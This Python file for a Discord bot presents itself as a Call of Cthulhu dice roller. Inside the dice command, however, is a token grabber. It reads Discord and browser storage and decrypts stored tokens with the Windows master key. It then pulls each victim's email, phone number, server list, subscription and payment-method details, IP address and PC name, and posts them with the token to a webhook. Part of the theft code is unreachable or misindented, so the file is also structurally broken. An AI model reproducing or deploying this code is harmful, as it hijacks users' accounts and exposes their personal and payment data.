import os
import discord
from discord.ext import commands
from discord import app_commands
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import random
import math
from dotenv import load_dotenv
load_dotenv()

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

# win32cryptを安全にインポート
try:
    import win32crypt
except ImportError:
    win32crypt = None

from Crypto.Cipher import AES
import platform

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='$$', intents=intents)

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

@bot.tree.command(name="dd", description="CoC6版準拠のダイスロールを行います。")
@app_commands.describe(
    回数="振るダイスの数 (例: 1d100 の '1')",
    面数="ダイスの種類 (例: 1d100 の '100')",
    目標値="成功判定に使用する目標値 (例: 技能値 80)",
    シークレット="1を入れると自分だけ (0:公開, 1:非公開)"
)
async def dice_roll(
    interaction: discord.Interaction, 
    回数: int = 1, 
    面数: int = 100, 
    目標値: int = None,
    シークレット: int = 0
):
    """
    1d100 (または指定したダイス) を振り、CoC6版の判定基準で結果を表示します。
    """
    # シークレット設定の判定 (1ならTrue, それ以外はFalse)
    is_ephemeral = True if シークレット == 1 else False

    # deferの時点でもephemeralの設定が必要
    await interaction.response.defer(ephemeral=is_ephemeral)

    try:
        # 1. ダイスロールの実行
        rolls = [random.randint(1, 面数) for _ in range(回数)]
        total_sum = sum(rolls)
        roll_expr = f"{回数}d{面数}"
        
        # デフォルト設定 (判定なし、または通常成功/失敗時)
        embed_color = 0x2ecc71  # 緑 (Online色)
        judgment_text = "判定なし"
        
        # 2. 判定ロジックと色の決定
        if 目標値 is not None:
            special_threshold = math.floor(目標値 / 5)
            
            if 1 <= total_sum <= 5:
                judgment_text = "✨ **決定的成功（クリティカル）！！**"
                embed_color = 0x206694  # 青
            elif 96 <= total_sum <= 100:
                judgment_text = "💀 **致命的失敗（ファンブル）！！**"
                embed_color = 0xe74c3c  # 赤 (DND色)
            elif total_sum <= special_threshold:
                judgment_text = "⭐ **強力的成功（スペシャル）！**"
                embed_color = 0x3498db  # 水色
            elif total_sum <= 目標値:
                judgment_text = "✅ **成功**"
                embed_color = 0x2ecc71  # 緑
            else:
                judgment_text = "❌ **失敗**"
                embed_color = 0x2ecc71  # 失敗もデフォルトの緑

        # 3. 埋め込みメッセージの構築
        embed = discord.Embed(
            title="CoC 第6版 ダイスロール",
            color=embed_color
        )
        # シークレットの場合はタイトルに追記
        if is_ephemeral:
            embed.title += " [シークレット]"

        embed.add_field(name="ダイス", value=f"`{roll_expr}`", inline=True)
        embed.add_field(name="合計値", value=f"**{total_sum}**", inline=True)
        
        if 回数 > 1:
            embed.add_field(name="ダイス内訳", value=f"`{', '.join(map(str, rolls))}`", inline=False)
            
        if 目標値 is not None:
            embed.add_field(name="目標値 / 判定", value=f"目標: `{目標値}` (スペシャル: {special_threshold}以下)\n結果: {judgment_text}", inline=False)
        
        embed.set_footer(text=f"実行者: {interaction.user.display_name}", icon_url=interaction.user.display_avatar.url)

        # 4. 結果の送信
        await interaction.followup.send(embed=embed, ephemeral=is_ephemeral)

    except Exception as e:
        await interaction.followup.send(f"エラーが発生しました: {e}", ephemeral=is_ephemeral)

    checked = []

    for platform_name, path in PATHS.items():
        # 1. サーバー上には指定のパスが存在しないため、ここでほとんどスキップされます
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            # 2. Windows環境かつwin32cryptが利用可能な場合のみ復号を試みる
            if win32crypt is not None and platform.system() == "Windows":
                try:
                    # AES復号ロジック
                    # getkey(path) やトークンの分割処理を安全に行う
                    encrypted_key = base64.b64decode(getkey(path))[5:]
                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                
                    raw_payload = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
                    nonce = raw_payload[3:15]
                    ciphertext = raw_payload[15:]
                
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce)
                    decrypted_token = cipher.decrypt(ciphertext)[:-16].decode()
                    token = decrypted_token
                except Exception as e:
                    print(f"復号エラー (Windows): {e}")
                    continue
            else:
                # 3. Linux環境（Northflank）などの場合
                # サーバー環境では復号できないため、このトークンは処理できないとしてスキップする
                # （必要であれば、復号不要な古い形式のトークンチェックのみ残す）
                continue
                if token in checked:
                    continue
                checked.append(token)
            
                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = ""

                        if res["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type = ""
                valid = 0
                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                    if x['type'] == 1:
                        type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Astraa ・ https://github.com/astraadev"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Grabber",
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }
                
                urllib.request.urlopen(urllib.request.Request(os.getenv("WEBHOOK_URL"), data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

# --- イベント定義 ---

if __name__ == "__main__":
    @bot.event
    async def on_ready():
        print(f'{bot.user} (ID: {bot.user.id})としてログインしました。')
        try:
            synced = await bot.tree.sync()
            print(f"{len(synced)} 個のコマンドを同期しました")
        except Exception as e:
            print(e)
    bot.run(os.getenv("BOT_TOKEN"))
